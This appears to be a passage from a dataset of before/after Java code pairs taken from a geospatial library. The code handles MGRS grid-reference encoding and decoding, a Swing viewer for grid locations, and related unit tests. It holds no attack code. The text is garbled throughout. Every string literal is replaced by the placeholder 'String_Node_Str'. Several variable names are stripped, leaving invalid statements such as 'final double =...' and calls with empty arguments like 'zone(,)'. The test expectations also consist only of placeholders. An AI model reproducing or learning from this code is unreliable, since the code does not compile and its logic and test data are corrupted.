if (hasSquareIdentification) {
int rowBit=1 << (row + NORTHING_BITS_COUNT);
isValid=(info & rowBit) != 0;
if (isValid) {
rowBit=Integer.lowestOneBit(~(info | (rowBit - 1)));
}
if ((info & -rowBit) != 0) {
row+=GRID_ROW_COUNT;
}
}
row+=(info & NORTHING_BITS_MASK) * GRID_ROW_COUNT;
minX=col * GRID_SQUARE_SIZE;
minY=row * GRID_SQUARE_SIZE;
}
final double sx, sy;
if (i < end) {
i=nextComponent(owner,reference,base,i,end);
int s=endOfDigits(reference,i,end);
final double x, y;
if (s >= end) {
int length=s - i;
if ((length & 1) != 0) {
throw new GazetteerException(Resources.format(Resources.Keys.OddGridCoordinateLength_1,reference.subSequence(i,s)));
}
final int h=i + (length>>>=1);
sx=sy=MathFunctions.pow10(METRE_PRECISION_DIGITS - length);
x=parseCoordinate(reference,i,h,sx);
y=parseCoordinate(reference,h,s,sy);
}
 else {
sx=MathFunctions.pow10(METRE_PRECISION_DIGITS - (s - i));
x=parseCoordinate(reference,i,s,sx);
i=nextComponent(owner,reference,base,s,end);
s=endOfDigits(reference,i,end);
sy=MathFunctions.pow10(METRE_PRECISION_DIGITS - (s - i));
y=parseCoordinate(reference,i,s,sy);
if (s < end) {
throw new GazetteerException(Errors.format(Errors.Keys.UnexpectedCharactersAfter_2,reference.subSequence(base,s),CharSequences.trimWhitespaces(reference,s,end)));
}
}
minX+=x;
minY+=y;
}
 else if (hasSquareIdentification) {
sx=sy=GRID_SQUARE_SIZE;
}
 else {
sx=(ZONER.easting - GRID_SQUARE_SIZE) * 2;
sy=ZONER.northing;
}
maxX=minX + sx;
maxY=minY + sy;
if (!hasSquareIdentification) {
if (zone != 0) {
if (s < 0) {
southBoundLatitude=TransverseMercator.Zoner.SOUTH_BOUNDS;
northBoundLatitude=0;
}
 else {
southBoundLatitude=0;
northBoundLatitude=TransverseMercator.Zoner.NORTH_BOUNDS;
}
westBoundLongitude=0 - ZONER.width / 2;
eastBoundLongitude=0 + ZONER.width / 2;
}
 else {
if (s < 0) {
southBoundLatitude=Latitude.MIN_VALUE;
northBoundLatitude=TransverseMercator.Zoner.SOUTH_BOUNDS;
}
 else {
southBoundLatitude=TransverseMercator.Zoner.NORTH_BOUNDS;
northBoundLatitude=Latitude.MAX_VALUE;
}
westBoundLongitude=Longitude.MIN_VALUE;
eastBoundLongitude=Longitude.MAX_VALUE;
}
}
 else {
final MathTransform projection=crs.getConversionFromBase().getMathTransform();
computeGeographicBoundingBox(projection.inverse());
setTypeToChild();
if (sx < GRID_SQUARE_SIZE || sy < GRID_SQUARE_SIZE) {
setTypeToChild();
}
if (isValid && zone != 0) {
isValid=(northBoundLatitude >= s) && (southBoundLatitude < upperBound(s));
if (isValid) {
final double =(westBoundLongitude + eastBoundLongitude) / 2;
final double =(southBoundLatitude + northBoundLatitude) / 2;
int zoneError=ZONER.zone(,) - zone;
if (zoneError != 0) {
final int zc=ZONER.zoneCount();
if (zoneError > zc / 2) zoneError-=zc;
if (ZONER.isSpecialCase(zone,)) {
isValid=Math.abs(zoneError) <= 2;
}
 else {
final double r=Math.IEEEremainder( - ZONER.origin,ZONER.width);
final double cv=(minX - ZONER.easting) / ( - 0);
isValid=(Math.abs(r) * cv <= sx);
if (isValid) {
isValid=(zoneError == (r < 0 ? -1 : +1));
}
}
}
}
}
if (isValid && owner.getClipToValidArea()) {
final boolean changed;
if (zone != 0) {
double width=ZONER.width;
if (!ZONER.isSpecialCase(zone,s)) width/=2;
changed=clipGeographicBoundingBox(0 - width,s,0 + width,upperBound(s));
}
 else if (s < 0) {
changed=clipGeographicBoundingBox(Longitude.MIN_VALUE,Latitude.MIN_VALUE,Longitude.MAX_VALUE,TransverseMercator.Zoner.SOUTH_BOUNDS);
}
 else {
changed=clipGeographicBoundingBox(Longitude.MIN_VALUE,TransverseMercator.Zoner.NORTH_BOUNDS,Longitude.MAX_VALUE,Latitude.MAX_VALUE);
}
if (changed) {
clipProjectedEnvelope(projection,sx / 100,sy / 100);
}
}
}
if (!isValid) {
final String gzd;
try {
gzd=owner.encoder(crs).encode(owner,getDirectPosition(),true,""String_Node_Str"",0);
}
 catch (IllegalArgumentException|FactoryException e) {
throw new GazetteerException(e.getLocalizedMessage(),e);
}
final CharSequence ref=reference.subSequence(base,end);
throw new ReferenceVerifyException(Resources.format(Resources.Keys.InconsistentWithGZD_2,ref,gzd));
}
}"
91727,"/** 
 * Implementation of   {@link #tryAdvance(Consumer)} and {@link #forEachRemaining(Consumer)}. The   {@code all}argument specifies whether this method is invoked for a single element or for all remaining ones.
 */
private boolean advance(final Consumer<? super String> action,final boolean all){
  final int digits=digits();
  final String separator=getSeparator();
  if (normalized == null) {
    normalized=new DirectPosition2D();
  }
  boolean found=false;
  try {
    do {
      if (pending != null) {
        action.accept(pending);
        pending=null;
        found=true;
        continue;
      }
      cell.setRect(gridX,gridY,step,step);
      if (areaOfInterest.intersects(Shapes2D.transform(gridToAOI,cell,cell))) {
        int x=gridX;
        if (x < xCenter) {
          x+=step - 1;
        }
        normalized.setOrdinate(0,x);
        normalized.setOrdinate(1,gridY);
        String ref=encoder.encode(this,normalized,false,separator,digits);
        if (ref != null) {
          final char previous=latitudeBand;
          latitudeBand=encoder.latitudeBand;
          if (latitudeBand != previous && previous != 0) {
            pending=ref;
            normalized.setOrdinate(1,gridY - 1);
            ref=encoder.encode(this,normalized,false,separator,digits);
            if (ref == null || encoder.latitudeBand == previous) {
              ref=pending;
              pending=null;
            }
          }
          action.accept(ref);
          found=true;
        }
      }
 else       if (optimize) {
        gridY=yEnd;
      }
      final boolean end=downward ? ((gridY-=step) <= yEnd) : ((gridY+=step) >= yEnd);
      if (end) {
        gridY=yStart;
        latitudeBand=0;
        if ((gridX+=step) >= xEnd) {
          break;
        }
      }
    }
 while (all || !found);
  }
 catch (  FactoryException|TransformException e) {
    throw (ArithmeticException)new ArithmeticException(Errors.format(Errors.Keys.OutsideDomainOfValidity)).initCause(e);
  }
  return found;
}","/** 
 * Implementation of   {@link #tryAdvance(Consumer)} and {@link #forEachRemaining(Consumer)}. The   {@code all}argument specifies whether this method is invoked for a single element or for all remaining ones.
 */
private boolean advance(final Consumer<? super String> action,final boolean all){
  final int digits=digits();
  final String separator=getSeparator();
  if (normalized == null) {
    normalized=new DirectPosition2D();
  }
  boolean found=false;
  try {
    do {
      if (pending != null) {
        action.accept(pending);
        pending=null;
        found=true;
        continue;
      }
      cell.setRect(gridX,gridY,step,step);
      if (areaOfInterest.intersects(Shapes2D.transform(gridToAOI,cell,cell))) {
        int x=gridX;
        if (x < xCenter) {
          x+=step - 1;
        }
        normalized.setOrdinate(0,x);
        normalized.setOrdinate(1,gridY);
        String ref=encoder.encode(this,normalized,false,separator,digits);
        if (ref != null) {
          char previous=latitudeBand;
          latitudeBand=encoder.latitudeBand;
          if (latitudeBand != previous && previous != 0) {
            pending=ref;
            int y=gridY - 1;
            if (downward) {
              y+=step;
              previous=latitudeBand;
            }
            normalized.setOrdinate(1,y);
            ref=encoder.encode(this,normalized,false,separator,digits);
            if (ref == null || encoder.latitudeBand == previous) {
              ref=pending;
              pending=null;
            }
          }
          action.accept(ref);
          found=true;
        }
      }
 else       if (optimize) {
        gridY=yEnd;
      }
      final boolean end=downward ? ((gridY-=step) <= yEnd) : ((gridY+=step) >= yEnd);
      if (end) {
        gridY=yStart;
        latitudeBand=0;
        if ((gridX+=step) >= xEnd) {
          break;
        }
      }
    }
 while (all || !found);
  }
 catch (  FactoryException|TransformException e) {
    throw (ArithmeticException)new ArithmeticException(Errors.format(Errors.Keys.OutsideDomainOfValidity)).initCause(e);
  }
  return found;
}"
91728,"/** 
 * Performs the given action for each remaining MGRS codes.
 */
@Override public void forEachRemaining(final Consumer<? super String> action){
  advance(action,true);
}","/** 
 * Performs the given action for each remaining MGRS codes.
 */
@Override public void forEachRemaining(final Consumer<? super String> action){
  advance(action,true);
  if (pending != null) {
    action.accept(pending);
    pending=null;
  }
}"
91729,"/** 
 * If this iterator is backed by only one worker iterator, returns that worker iterator. Otherwise returns   {@code this}. This method should be invoked after construction.
 */
final Spliterator<String> simplify(){
  return (iterators.length == 1) ? iterators[0] : this;
}","/** 
 * If this iterator is backed by only one worker iterator, returns that worker iterator. Otherwise returns   {@code this}. This method should be invoked after construction.
 */
final Spliterator<String> simplify(){
  return (upper - index == 1) ? iterators[index] : this;
}"
91730,"/** 
 * Adds all locations in the given area of interest.
 * @param coder           the encoder to use for computing locations and their envelopes.
 * @param areaOfInterest  the geographic or projected area where to get locations.
 * @throws FactoryException if a transformation to the display CRS can not be obtained.
 * @throws TransformException if an error occurred while transforming an envelope.
 */
public void addLocations(final MilitaryGridReferenceSystem.Coder coder,final Envelope areaOfInterest) throws FactoryException, TransformException {
  final Iterator<String> it=coder.encode(areaOfInterest);
  while (it.hasNext()) {
    final String code=it.next();
    addLocation(code,coder.decode(code));
  }
}","/** 
 * Adds all locations in the given area of interest.
 * @param coder           the encoder to use for computing locations and their envelopes.
 * @param areaOfInterest  the geographic or projected area where to get locations.
 * @throws FactoryException if a transformation to the display CRS can not be obtained.
 * @throws TransformException if an error occurred while transforming an envelope.
 */
public void addLocations(final MilitaryGridReferenceSystem.Coder coder,final Envelope areaOfInterest) throws FactoryException, TransformException {
  final Iterator<String> it=coder.encode(areaOfInterest);
  while (it.hasNext()) {
    final String code=it.next();
    addLocation(code,coder.decode(code));
    System.out.print(""String_Node_Str"" + code + ""String_Node_Str"");
  }
  envelope=((MathTransform2D)CRS.findOperation(areaOfInterest.getCoordinateReferenceSystem(),displayCRS,null).getMathTransform()).createTransformedShape(new IntervalRectangle(areaOfInterest));
}"
91731,"/** 
 * Creates a new, initially empty, viewer. Locations must be added by calls to   {@code addLocation()} methodsbefore the widget can be show.
 * @param displayCRS  the coordinate reference system to use for displaying the location shapes.
 */
public LocationViewer(final CoordinateReferenceSystem displayCRS){
  this.displayCRS=displayCRS;
  this.locations=new LinkedHashMap<>();
  setBackground(Color.BLACK);
}","/** 
 * Creates a new, initially empty, viewer. Locations must be added by calls to   {@code addLocation()} methodsbefore the widget can be show.
 * @param displayCRS  the coordinate reference system to use for displaying the location shapes.
 */
public LocationViewer(final SingleCRS displayCRS){
  this.displayCRS=displayCRS;
  this.locations=new LinkedHashMap<>();
  setBackground(Color.BLACK);
}"
91732,"/** 
 * Shows all locations in the given area of interest.
 * @param coder           the encoder to use for computing locations and their envelopes.
 * @param areaOfInterest  the geographic or projected area where to get locations.
 * @param displayCRS      the CRS to use for displaying the location shapes, or {@code null} for the envelope CRS.
 * @throws FactoryException if a transformation to the display CRS can not be obtained.
 * @throws TransformException if an error occurred while transforming an envelope.
 */
public static void show(final MilitaryGridReferenceSystem.Coder coder,final Envelope areaOfInterest,CoordinateReferenceSystem displayCRS) throws FactoryException, TransformException {
  if (displayCRS == null) {
    displayCRS=areaOfInterest.getCoordinateReferenceSystem();
  }
  final LocationViewer viewer=new LocationViewer(displayCRS);
  viewer.addLocations(coder,areaOfInterest);
  final JFrame frame=new JFrame(""String_Node_Str"");
  frame.getContentPane().add(viewer);
  frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
  frame.setSize(600,600);
  frame.setVisible(true);
}","/** 
 * Shows all locations in the given area of interest.
 * @param coder           the encoder to use for computing locations and their envelopes.
 * @param areaOfInterest  the geographic or projected area where to get locations.
 * @param displayCRS      the CRS to use for displaying the location shapes, or {@code null} for the envelope CRS.
 * @throws FactoryException if a transformation to the display CRS can not be obtained.
 * @throws TransformException if an error occurred while transforming an envelope.
 */
public static void show(final MilitaryGridReferenceSystem.Coder coder,final Envelope areaOfInterest,SingleCRS displayCRS) throws FactoryException, TransformException {
  if (displayCRS == null) {
    displayCRS=CRS.getHorizontalComponent(areaOfInterest.getCoordinateReferenceSystem());
  }
  final LocationViewer viewer=new LocationViewer(displayCRS);
  viewer.addLocations(coder,areaOfInterest);
  final JFrame frame=new JFrame(""String_Node_Str"");
  frame.getContentPane().add(viewer);
  frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
  frame.setSize(600,600);
  frame.setVisible(true);
}"
91733,"/** 
 * Invoked by Swing for painting this widget.
 * @param g  the graphic context where to paint.
 */
@Override protected void paintComponent(final Graphics g){
  super.paintComponent(g);
  final Graphics2D gr=(Graphics2D)g;
  final AffineTransform oldTr=gr.getTransform();
  final AffineTransform tr=AffineTransform.getScaleInstance(getWidth() / bounds.getWidth(),-getHeight() / bounds.getHeight());
  tr.translate(-bounds.getMinX(),-bounds.getMaxY());
  gr.transform(tr);
  gr.setColor(Color.YELLOW);
  gr.setStroke(new BasicStroke(0));
  for (  final Shape location : locations.values()) {
    gr.draw(location);
  }
  gr.setTransform(oldTr);
  gr.setColor(Color.CYAN);
  final Point2D.Double p=new Point2D.Double();
  for (  final Map.Entry<String,Shape> entry : locations.entrySet()) {
    final Rectangle2D b=entry.getValue().getBounds2D();
    p.x=b.getCenterX();
    p.y=b.getCenterY();
    final Point2D pt=tr.transform(p,p);
    final String label=entry.getKey();
    gr.drawString(label,(float)(pt.getX() - 4.5 * label.length()),(float)pt.getY());
  }
}","/** 
 * Invoked by Swing for painting this widget.
 * @param g  the graphic context where to paint.
 */
@Override protected void paintComponent(final Graphics g){
  super.paintComponent(g);
  final Graphics2D gr=(Graphics2D)g;
  final AffineTransform oldTr=gr.getTransform();
  final AffineTransform tr=AffineTransform.getScaleInstance(getWidth() / bounds.getWidth(),-getHeight() / bounds.getHeight());
  tr.translate(-bounds.getMinX(),-bounds.getMaxY());
  gr.transform(tr);
  gr.setStroke(new BasicStroke(0));
  if (envelope != null) {
    gr.setColor(Color.RED);
    gr.draw(envelope);
  }
  gr.setColor(Color.YELLOW);
  for (  final Shape location : locations.values()) {
    gr.draw(location);
  }
  gr.setTransform(oldTr);
  gr.setColor(Color.CYAN);
  final Point2D.Double p=new Point2D.Double();
  for (  final Map.Entry<String,Shape> entry : locations.entrySet()) {
    final Rectangle2D b=entry.getValue().getBounds2D();
    p.x=b.getCenterX();
    p.y=b.getCenterY();
    final Point2D pt=tr.transform(p,p);
    final String label=entry.getKey();
    gr.drawString(label,(float)(pt.getX() - 4.5 * label.length()),(float)pt.getY());
  }
}"
91734,"/** 
 * Returns a coder instance to test.
 */
private MilitaryGridReferenceSystem.Coder coder(){
  return new MilitaryGridReferenceSystem().createCoder();
}","/** 
 * Returns a coder instance to test.
 */
private static MilitaryGridReferenceSystem.Coder coder(){
  return new MilitaryGridReferenceSystem().createCoder();
}"
91735,"/** 
 * Tests iteration over all codes in a given area of interest. The geographic area used for this test is based on <a href=""https://www.ff-reichertshausen.de/cms/wp-content/uploads/2012/10/utmmeldegitter.jpg"">this picture</a> (checked on March 2017).
 * @throws TransformException if an error occurred while computing the coordinate.
 */
@Test @DependsOnMethod({""String_Node_Str"",""String_Node_Str""}) public void testIterator() throws TransformException {
  final MilitaryGridReferenceSystem.Coder coder=coder();
  coder.setPrecision(100000);
  final Iterator<String> it=coder.encode(new Envelope2D(CommonCRS.defaultGeographic(),5,47,8,10));
  final List<String> expected=Arrays.asList(""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"");
  final Set<String> remaining=new HashSet<>(expected);
  assertEquals(""String_Node_Str"",expected.size(),remaining.size());
  while (it.hasNext()) {
    final String code=it.next();
    assertTrue(code,remaining.remove(code));
  }
  assertTrue(remaining.toString(),remaining.isEmpty());
}","/** 
 * Implementation of   {@link #testIteratorUTM()}.
 */
private static void testIterator(final Envelope2D areaOfInterest,final List<String> expected) throws TransformException {
  final MilitaryGridReferenceSystem.Coder coder=coder();
  coder.setPrecision(100000);
  final Set<String> remaining=new HashSet<>(expected);
  assertEquals(""String_Node_Str"",expected.size(),remaining.size());
  for (final Iterator<String> it=coder.encode(areaOfInterest); it.hasNext(); ) {
    final String code=it.next();
    assertTrue(code,remaining.remove(code));
  }
  assertTrue(remaining.toString(),remaining.isEmpty());
  assertTrue(remaining.addAll(expected));
  assertEquals(""String_Node_Str"",expected.size(),remaining.size());
  coder.encode(areaOfInterest,true).forEach((code) -> assertTrue(code,remaining.remove(code)));
  assertTrue(remaining.toString(),remaining.isEmpty());
}"
91736,"/** 
 * Tests if the interior of this shape intersects the interior of a specified rectangle.
 * @param rect  the specified rectangle.
 * @return {@code true} if this shape and the specified rectangle intersect each other.
 */
@Override public final boolean intersects(final Rectangle2D rect){
  if (!(xmin < xmax && ymin < ymax)) {
    return false;
  }
 else {
    final double xmin2=rect.getMinX();
    final double xmax2=rect.getMaxX();
    if (!(xmax2 > xmin2))     return false;
    final double ymin2=rect.getMinY();
    final double ymax2=rect.getMaxY();
    if (!(ymax2 > ymin2))     return false;
    return (xmin2 < xmax && ymin2 < ymax && xmax2 > xmin && ymax2 > ymin);
  }
}","/** 
 * Tests if the interior of this shape intersects the interior of a specified rectangle. The edges are considered exclusive; this method returns   {@code false} if the two rectanglesjust touch to each other.
 * @param rect  the specified rectangle.
 * @return {@code true} if this shape and the specified rectangle intersect each other.
 */
@Override public final boolean intersects(final Rectangle2D rect){
  if (!(xmin < xmax && ymin < ymax)) {
    return false;
  }
 else {
    final double xmin2=rect.getMinX();
    final double xmax2=rect.getMaxX();
    if (!(xmax2 > xmin2))     return false;
    final double ymin2=rect.getMinY();
    final double ymax2=rect.getMaxY();
    if (!(ymax2 > ymin2))     return false;
    return (xmin2 < xmax && ymin2 < ymax && xmax2 > xmin && ymax2 > ymin);
  }
}"
91737,"/** 
 * Decodes the given MGRS reference into a position. The Coordinate Reference System (CRS) associated to the returned position depends on the given reference.
 * @param reference  MGRS string to decode.
 * @return a new position with the longitude at ordinate 0 and latitude at ordinate 1.
 * @throws TransformException if an error occurred while parsing the given string.
 */
public DirectPosition decode(final CharSequence reference) throws TransformException {
  ArgumentChecks.ensureNonNull(""String_Node_Str"",reference);
  final int end=CharSequences.skipTrailingWhitespaces(reference,0,reference.length());
  final int base=CharSequences.skipLeadingWhitespaces(reference,0,end);
  int i=endOfDigits(reference,base,end);
  final int zone=parseInt(reference,base,i,Resources.Keys.IllegalUTMZone_1);
  if (zone < 1 || zone > 60) {
    throw new GazetteerException(Resources.format(Resources.Keys.IllegalUTMZone_1,zone));
  }
  double s=Double.NaN;
  int col=1, row=0;
  boolean hasSquareIdentification=true;
  for (int part=1; part <= 3; part++) {
    if (part == 2 && i >= end) {
      hasSquareIdentification=false;
      break;
    }
    i=nextComponent(reference,base,i,end);
    int c=Character.codePointAt(reference,i);
    final int ni=i + Character.charCount(c);
    if (c < 'A' || c > 'Z') {
      if (c >= 'a' && c <= 'z') {
        c-=('a' - 'A');
      }
 else {
        final short key;
        final CharSequence token;
        if (part == 1) {
          key=Resources.Keys.IllegalLatitudeBand_1;
          token=reference.subSequence(i,ni);
        }
 else {
          key=Resources.Keys.IllegalSquareIdentification_1;
          token=CharSequences.token(reference,i);
        }
        throw new GazetteerException(Resources.format(key,token));
      }
    }
    if (c >= EXCLUDE_O)     c--;
    if (c >= EXCLUDE_I)     c--;
switch (part) {
case 1:
{
        s=(c - 'C') * LATITUDE_BAND_HEIGHT + TransverseMercator.Zoner.SOUTH_BOUNDS;
        break;
      }
case 2:
{
switch (zone % 3) {
case 1:
        col=c - ('A' - 1);
      break;
case 2:
    col=c - ('J' - 2);
  break;
case 0:
col=c - ('S' - 3);
break;
}
break;
}
case 3:
{
if ((zone & 1) != 0) {
row=c - 'A';
}
 else {
row=c - 'F';
if (row < 0) {
row+=GRID_ROW_COUNT;
}
}
break;
}
}
i=ni;
}
final double 0=TransverseMercator.Zoner.UTM.centralMeridian(zone);
final ProjectedCRS crs=datum.universal(Math.signum(s),0);
final DirectPosition2D position=new DirectPosition2D(s,0);
final MathTransform projection=crs.getConversionFromBase().getMathTransform();
final double northing=Math.floor(projection.transform(position,position).getOrdinate(1) / (GRID_SQUARE_SIZE * GRID_ROW_COUNT)) * (GRID_SQUARE_SIZE * GRID_ROW_COUNT);
position.setCoordinateReferenceSystem(crs);
position.x=col * GRID_SQUARE_SIZE;
position.y=row * GRID_SQUARE_SIZE + northing;
if (i < end) {
i=nextComponent(reference,base,i,end);
int s=endOfDigits(reference,i,end);
final double x, y;
if (s >= end) {
final int length=s - i;
final int h=i + (length >>> 1);
if ((length & 1) != 0) {
throw new GazetteerException(Resources.format(Resources.Keys.MismatchedResolution_2,reference.subSequence(i,h),reference.subSequence(h,s)));
}
x=parseCoordinate(reference,i,h);
y=parseCoordinate(reference,h,s);
}
 else {
x=parseCoordinate(reference,i,s);
i=nextComponent(reference,base,s,end);
s=endOfDigits(reference,i,end);
y=parseCoordinate(reference,i,s);
if (s < end) {
throw new GazetteerException(Errors.format(Errors.Keys.UnexpectedCharactersAfter_2,reference.subSequence(base,s),CharSequences.trimWhitespaces(reference,s,end)));
}
}
position.x+=x;
position.y+=y;
}
if (hasSquareIdentification) {
final MathTransform inverse=projection.inverse();
DirectPosition check=inverse.transform(position,null);
double =check.getOrdinate(0);
double delta=truncateLastLatitudeBand() - s;
if ((s >= 0) ? (delta < 0) : (delta > LATITUDE_BAND_HEIGHT)) {
position.y+=Math.signum(s) * (GRID_SQUARE_SIZE * GRID_ROW_COUNT);
check=inverse.transform(position,check);
delta=truncateLastLatitudeBand(=check.getOrdinate(0)) - s;
}
final int actual=TransverseMercator.Zoner.UTM.zone(,check.getOrdinate(1));
final boolean isHighLat=Math.abs() >= TransverseMercator.Zoner.NORWAY_BOUNDS;
final boolean isZoneValid=Math.abs(actual - zone) <= (isHighLat ? 1 : 0);
final boolean isBandValid=delta >= 0 && delta <= LATITUDE_BAND_HEIGHT;
if (!isBandValid || !isZoneValid) {
final String gzd;
try {
gzd=encoder(crs).encode(this,position,""String_Node_Str"",0);
}
 catch (IllegalArgumentException|FactoryException e) {
throw new GazetteerException(e.getLocalizedMessage(),e);
}
final CharSequence ref=reference.subSequence(base,end);
throw new ReferenceVerifyException(Resources.format(Resources.Keys.InconsistentWithGZD_2,ref,gzd));
}
}
return position;
}","/** 
 * Decodes the given MGRS reference into a position. The Coordinate Reference System (CRS) associated to the returned position depends on the given reference.
 * @param reference  MGRS string to decode.
 * @return a new position with the longitude at ordinate 0 and latitude at ordinate 1.
 * @throws TransformException if an error occurred while parsing the given string.
 */
public DirectPosition decode(final CharSequence reference) throws TransformException {
  ArgumentChecks.ensureNonNull(""String_Node_Str"",reference);
  final int end=CharSequences.skipTrailingWhitespaces(reference,0,reference.length());
  final int base=CharSequences.skipLeadingWhitespaces(reference,0,end);
  int i=endOfDigits(reference,base,end);
  final int zone=parseInt(reference,base,i,Resources.Keys.IllegalUTMZone_1);
  if (zone < 1 || zone > 60) {
    throw new GazetteerException(Resources.format(Resources.Keys.IllegalUTMZone_1,zone));
  }
  double s=Double.NaN;
  int col=1, row=0;
  boolean hasSquareIdentification=true;
  for (int part=1; part <= 3; part++) {
    if (part == 2 && i >= end) {
      hasSquareIdentification=false;
      break;
    }
    i=nextComponent(reference,base,i,end);
    int c=Character.codePointAt(reference,i);
    final int ni=i + Character.charCount(c);
    if (c < 'A' || c > 'Z') {
      if (c >= 'a' && c <= 'z') {
        c-=('a' - 'A');
      }
 else {
        final short key;
        final CharSequence token;
        if (part == 1) {
          key=Resources.Keys.IllegalLatitudeBand_1;
          token=reference.subSequence(i,ni);
        }
 else {
          key=Resources.Keys.IllegalSquareIdentification_1;
          token=CharSequences.token(reference,i);
        }
        throw new GazetteerException(Resources.format(key,token));
      }
    }
    if (c >= EXCLUDE_O)     c--;
    if (c >= EXCLUDE_I)     c--;
switch (part) {
case 1:
{
        s=(c - 'C') * LATITUDE_BAND_HEIGHT + TransverseMercator.Zoner.SOUTH_BOUNDS;
        break;
      }
case 2:
{
switch (zone % 3) {
case 1:
        col=c - ('A' - 1);
      break;
case 2:
    col=c - ('J' - 2);
  break;
case 0:
col=c - ('S' - 3);
break;
}
break;
}
case 3:
{
if ((zone & 1) != 0) {
row=c - 'A';
}
 else {
row=c - 'F';
if (row < 0) {
row+=GRID_ROW_COUNT;
}
}
break;
}
}
i=ni;
}
final double 0=TransverseMercator.Zoner.UTM.centralMeridian(zone);
final ProjectedCRS crs=datum.universal(Math.signum(s),0);
final DirectPosition2D position=new DirectPosition2D(s,0);
final MathTransform projection=crs.getConversionFromBase().getMathTransform();
double northing=projection.transform(position,position).getOrdinate(1) / (GRID_SQUARE_SIZE * GRID_ROW_COUNT);
northing=(s >= 0) ? Math.floor(northing) : Math.ceil(northing);
northing*=(GRID_SQUARE_SIZE * GRID_ROW_COUNT);
position.setCoordinateReferenceSystem(crs);
position.x=col * GRID_SQUARE_SIZE;
position.y=row * GRID_SQUARE_SIZE + northing;
if (i < end) {
i=nextComponent(reference,base,i,end);
int s=endOfDigits(reference,i,end);
final double x, y;
if (s >= end) {
final int length=s - i;
final int h=i + (length >>> 1);
if ((length & 1) != 0) {
throw new GazetteerException(Resources.format(Resources.Keys.MismatchedResolution_2,reference.subSequence(i,h),reference.subSequence(h,s)));
}
x=parseCoordinate(reference,i,h);
y=parseCoordinate(reference,h,s);
}
 else {
x=parseCoordinate(reference,i,s);
i=nextComponent(reference,base,s,end);
s=endOfDigits(reference,i,end);
y=parseCoordinate(reference,i,s);
if (s < end) {
throw new GazetteerException(Errors.format(Errors.Keys.UnexpectedCharactersAfter_2,reference.subSequence(base,s),CharSequences.trimWhitespaces(reference,s,end)));
}
}
position.x+=x;
position.y+=y;
}
if (hasSquareIdentification) {
final MathTransform inverse=projection.inverse();
DirectPosition check=inverse.transform(position,null);
double =check.getOrdinate(0);
double delta=truncateLastLatitudeBand() - s;
if ((s >= 0) ? (delta < 0) : (delta > LATITUDE_BAND_HEIGHT)) {
position.y+=Math.signum(s) * (GRID_SQUARE_SIZE * GRID_ROW_COUNT);
check=inverse.transform(position,check);
delta=truncateLastLatitudeBand(=check.getOrdinate(0)) - s;
}
final int actual=TransverseMercator.Zoner.UTM.zone(,check.getOrdinate(1));
final boolean isHighLat=Math.abs() >= TransverseMercator.Zoner.NORWAY_BOUNDS;
final boolean isZoneValid=Math.abs(actual - zone) <= (isHighLat ? 1 : 0);
final boolean isBandValid=delta >= 0 && delta <= LATITUDE_BAND_HEIGHT;
if (!isBandValid || !isZoneValid) {
final String gzd;
try {
gzd=encoder(crs).encode(this,position,""String_Node_Str"",0);
}
 catch (IllegalArgumentException|FactoryException e) {
throw new GazetteerException(e.getLocalizedMessage(),e);
}
final CharSequence ref=reference.subSequence(base,end);
throw new ReferenceVerifyException(Resources.format(Resources.Keys.InconsistentWithGZD_2,ref,gzd));
}
}
return position;
}"
91738,"/** 
 * Tests decoding of various coordinates, all at the same resolution.
 * @throws TransformException if an error occurred while computing the coordinate.
 */
@Test @DependsOnMethod(""String_Node_Str"") public void testDecoding() throws TransformException {
  final MilitaryGridReferenceSystem.Coder coder=coder();
  DirectPosition position;
  position=coder.decode(""String_Node_Str"");
  assertSame(""String_Node_Str"",CommonCRS.WGS84.universal(41,10),position.getCoordinateReferenceSystem());
  assertEquals(""String_Node_Str"",584102,position.getOrdinate(0),STRICT);
  assertEquals(""String_Node_Str"",4539239,position.getOrdinate(1),STRICT);
  position=coder.decode(""String_Node_Str"");
  assertSame(""String_Node_Str"",CommonCRS.WGS84.universal(82,-10),position.getCoordinateReferenceSystem());
  assertEquals(""String_Node_Str"",484463,position.getOrdinate(0),STRICT);
  assertEquals(""String_Node_Str"",9104963,position.getOrdinate(1),STRICT);
